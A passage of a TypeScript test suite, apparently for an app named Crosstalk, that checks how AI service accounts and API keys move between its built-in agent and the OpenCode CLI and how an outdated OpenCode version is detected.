    expect(app.endpointFor("opencode", account.id, MODEL)).toMatchObject({ baseUrl: fake.base, key: KEY });
    // A chat with it names one of its accounts.
    expect(() => app.chats.create({ provider: "opencode", cwd: dir } as never)).toThrow("OpenCode runs on an AI service");
  });

  test("a service moves between Crosstalk's agent and OpenCode with its key; the old account stays while chats use it", async () => {
    const fake = fakeRefuseless({ key: KEY });
    cleanups.push(() => fake.stop());
    const { app, dir } = setup(fake);
    const which = app.providers.which.bind(app.providers);
    app.providers.which = (p) => (p === "opencode" ? FAKE : which(p));
    const old = app.providers.setEndpointAccount("builtin", { label: "Refuseless", baseUrl: fake.base, apiKey: KEY, models: [MODEL], contextWindow: 1_048_576, protocol: "chat" });
    const moved = app.providers.switchServiceAgent("builtin", old.id, "opencode");
    expect(moved.provider).toBe("opencode");
    expect(app.providers.endpointOf("opencode", moved.id)).toMatchObject({ key: KEY, baseUrl: fake.base, models: [MODEL], protocol: "chat" });
    // Nothing used the old one: it's gone, with its key.
    expect(app.providers.endpointOf("builtin", old.id)).toBeNull();

    // A chat on it keeps the account it runs on; moving back again answers with what's there.
    const room = app.chats.create({ provider: "opencode", account: moved.id, model: MODEL, cwd: dir } as never);
    const back = app.providers.switchServiceAgent("opencode", moved.id, "builtin");
    expect(back.provider).toBe("builtin");
    expect(app.providers.endpointOf("opencode", moved.id)).not.toBeNull();
    expect(app.providers.switchServiceAgent("opencode", moved.id, "builtin").id).toBe(back.id);
    expect(app.store.getRoom(room.id)).toBeTruthy();

    expect(() => app.providers.switchServiceAgent("opencode", moved.id, "codex")).toThrow("between Crosstalk's agent and OpenCode");
    expect(() => app.providers.switchServiceAgent("opencode", "nope", "builtin")).toThrow("No such AI service");
    app.providers.which = (p) => (p === "opencode" ? null : which(p));
    expect(() => app.providers.switchServiceAgent("builtin", back.id, "opencode")).toThrow("isn't installed on this machine yet");
  });

  test("a version 1 install is said to be the wrong one", async () => {
    const { app } = setup();
    const dir = folder();
    const write = (name: string, version: string) => {
      const bin = join(dir, name);
      writeFileSync(bin, `#!/bin/sh\necho "opencode v${version}"\n`);
      chmodSync(bin, 0o755);
      return bin;
    };
    expect(await opencodeProvider.checkAuth!(app, write("v2", OPENCODE_VERSION))).toEqual({ signedIn: true, authMethod: "AI service" });
    expect((await opencodeProvider.checkAuth!(app, write("v1", "1.19.5"))).error).toContain("Crosstalk needs version 2");
    expect(opencodeProvider.installCommand!.join(" ")).toContain(`@opencode/cli@${OPENCODE_VERSION}`);
  });
});
